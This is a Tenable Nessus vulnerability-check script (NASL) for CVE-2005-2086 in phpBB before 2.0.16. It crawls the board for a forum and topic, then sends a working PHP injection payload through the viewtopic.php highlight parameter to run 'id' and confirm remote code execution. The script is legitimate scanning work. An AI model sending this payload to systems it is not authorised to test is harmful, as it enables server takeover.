#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18589);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2005-2086");
  script_bugtraq_id(14086);
  script_osvdb_id(17613);

  script_name(english:"phpBB < 2.0.16 viewtopic.php Highlighting Feature Arbitrary PHP Code Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a code
injection vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of phpBB that allows attackers to
inject arbitrary PHP code to the 'viewtopic.php' script to be executed
subject to the privileges of the web server userid." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/403631/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpBB version 2.0.16 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Phpbb RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'phpBB viewtopic.php Arbitrary Code Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/29");
 script_set_attribute(attribute:"patch_publication_date", value: "2005/06/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/28");
 script_cvs_date("$Date: 2016/05/16 14:22:06 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:phpbb_group:phpbb");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  summary["english"] = "Checks for remote code execution vulnerability in phpBB <= 2.0.15";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpBB");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # First we need a forum number.
  r = http_send_recv3(method:"GET", item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  pat = '<a href="viewforum\\.php\\?f=([0-9]+)';
  matches = egrep(pattern:pat, string:res, icase:TRUE);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      forum = eregmatch(pattern:pat, string:match);
      if (!isnull(forum)) {
        forum = forum[1];
        break;
      }
    }
  }

  if (isnull(forum)) {
    debug_print("couldn't find a forum to use!", level:1);
  }
  else {
    # Next we need a topic number.
    r = http_send_recv3(method:"GET",
      item:string(
        dir, "/viewforum.php?",
        "f=", forum
      ), 
      port:port
    );
    if (isnull(r)) exit(0);
    res = r[2];

    pat = '<a href="viewtopic\\.php\\?t=([0-9]+)';
    matches = egrep(pattern:pat, string:res, icase:TRUE);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        topic = eregmatch(pattern:pat, string:match);
        if (!isnull(topic)) {
          topic = topic[1];
          break;
        }
      }
    }

    if (isnull(topic)) {
      debug_print("couldn't find a topic to use!", level:1);
    }
    else {
      # Finally, we can try to exploit the flaw.
      # exploit method comes from public exploit released by dab@digitalsec.net
      u = string(dir, "/viewtopic.php?", "t=", topic, "&", "highlight='.system(getenv(HTTP_PHP)).'");
      r = http_send_recv3(method: "GET", version: 11, item: u, port: port,
      	add_headers: make_array("PHP", "id") );
      if (isnull(r)) exit(0);
      res = r[2];

      line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
      if (line)
      {
        report = string(
          "Nessus was able to execute the command 'id' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          line
        );
        security_hole(port:port, extra:report);
        exit(0);
      }
    }
  }
}
